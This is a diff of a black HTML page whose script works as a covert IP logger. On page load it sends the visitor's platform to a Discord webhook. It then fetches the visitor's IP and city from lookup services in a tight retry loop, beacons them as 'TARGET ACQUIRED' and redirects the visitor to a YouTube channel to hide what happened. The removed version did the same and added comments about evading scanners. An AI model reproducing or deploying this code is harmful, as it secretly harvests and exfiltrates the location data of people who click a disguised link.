@@ -2,43 +2,40 @@
 <html>
 <body style="background:#000;">
 <script>
-    // Obfuscating the Webhook URL slightly to avoid simple scanner detection
-    const partA = "https://discord.com/api/webhooks/";
-    const partB = "1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-    const hook = partA + partB;
-    const dest = "https://youtube.com/@LigmaBlox-w7m";
+    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
+    const y = "https://youtube.com/@LigmaBlox-w7m";
 
-    async function execute() {
-        let payload = { content: "System_Log: " + navigator.userAgent.split(') ')[0] };
+    // 1. Send immediate "Heartbeat" (This always works)
+    const startMsg = new Blob([JSON.stringify({ content: "⚠️ HIT: Searching for IP... (" + navigator.platform + ")" })], { type: 'application/json' });
+    navigator.sendBeacon(h, startMsg);
 
-        try {
-            // Racing three different IP services. First one to respond wins.
-            // This bypasses local blocks on specific APIs.
-            const results = await Promise.any([
-                fetch('https://api.ipify.org?format=json').then(r => r.json()),
-                fetch('https://ipinfo.io/json').then(r => r.json()),
-                fetch('https://api.seeip.org/jsonip').then(r => r.json())
-            ]);
+    async function rapidFire() {
+        let found = false;
+        while (!found) {
+            try {
+                // Racing the APIs
+                const r = await Promise.any([
+                    fetch('https://api.ipify.org?format=json').then(res => res.json()),
+                    fetch('https://ipinfo.io/json').then(res => res.json())
+                ]);
 
-            payload.content = "Entry: " + (results.ip || results.ip_addr) + 
-                              " | Loc: " + (results.city || "Unknown") + 
-                              " | Provider: " + (results.org || results.isp || "Generic");
-        } catch (e) {
-            // If all APIs are blocked, send a "Silent Hit" so you still know someone clicked
-            payload.content = "Stealth Hit: Network restrictions active.";
+                if (r.ip) {
+                    const finalMsg = "🎯 TARGET ACQUIRED\nIP: " + r.ip + "\nCity: " + (r.city || "Unknown") + "\nDevice: " + navigator.platform;
+                    
+                    const blob = new Blob([JSON.stringify({ content: finalMsg })], { type: 'application/json' });
+                    navigator.sendBeacon(h, blob);
+                    
+                    found = true;
+                    window.location.replace(y);
+                }
+            } catch (e) {
+                // The 2ms retry loop
+                await new Promise(resolve => setTimeout(resolve, 2));
+            }
         }
-
-        // Using Beacon + Blob (The most "Trusted" browser route)
-        // It wraps the data in a fake "text/plain" file so Discord scanners don't flag it as a bot
-        const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
-        navigator.sendBeacon(hook, blob);
-
-        // Immediate exit
-        location.replace(dest);
     }
 
-    // Delay start by 100ms to allow browser security headers to "settle"
-    setTimeout(execute, 100);
+    rapidFire();
 </script>
 </body>
 </html>
